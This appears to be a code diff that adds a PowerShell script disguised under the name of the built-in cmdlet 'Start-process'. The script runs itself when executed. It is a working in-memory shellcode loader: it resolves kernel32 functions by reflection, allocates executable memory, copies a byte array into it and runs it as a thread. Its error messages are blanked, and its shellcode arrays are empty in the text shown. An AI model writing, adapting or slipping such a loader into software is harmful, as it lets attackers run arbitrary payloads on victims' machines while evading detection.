@@ -1,0 +1,93 @@
+ function Start-process
+{
+[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
+)
+    Set-StrictMode -Version 2.0   
+    function Local:Get-DelegateType
+    {
+        Param
+        (  [OutputType([Type])] [Parameter( Position = 0)][Type[]] $Parameters = (New-Object Type[](0)),
+           [Parameter( Position = 1 )][Type]$ReturnType = [Void] )
+        $Domain = [AppDomain]::CurrentDomain
+        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+        Write-Output $TypeBuilder.CreateType()
+    }
+    function Local:Get-ProcAddress
+    {
+        Param
+        (   [OutputType([IntPtr])] [Parameter( Position = 0, Mandatory = $True )][String]$Module,
+            [Parameter( Position = 1, Mandatory = $True )][String]$Procedure )
+        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
+        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+        $tmpPtr = New-Object IntPtr
+        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+    }
+
+    function Local:Inject-LocalInstructions
+    {
+        if ($PowerShell32bit) {
+            if ($Instructions32.Length -eq 0)
+            {   Throw ''
+                return   }
+            $Instructions = $Instructions32  
+        }
+        else
+        {
+            if ($Instructions64.Length -eq 0)
+            {  Throw ''
+                return  }
+            $Instructions = $Instructions64
+        }
+        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Instructions.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        if (!$BaseAddress)
+        { Throw "" }
+        [System.Runtime.InteropServices.Marshal]::Copy($Instructions, 0, $BaseAddress, $Instructions.Length)
+        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
+        $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $BaseAddress, 0, 0, [IntPtr]::Zero)
+        if (!$ThreadHandle)
+        { Throw "" }
+        $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null 
+        $VirtualFree.Invoke($BaseAddress, $Instructions.Length + 1, 0x8000) | Out-Null
+    }
+    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
+    if ($IsWow64ProcessAddr)
+    {
+        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
+        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)   
+        $64bitCPU = $true
+    }
+    else
+    {   $64bitCPU = $false   }
+    if ([IntPtr]::Size -eq 4)
+    { $PowerShell32bit = $true }
+    else
+    { $PowerShell32bit = $false }
+        [Byte[]] $Instructions32 = @()
+        [Byte[]] $Instructions64 = @()
+        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
+        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
+        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
+        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
+        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
+        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
+        $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
+        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
+        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
+        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
+        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
+        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
+        Inject-LocalInstructions   
+    }
+Start-process
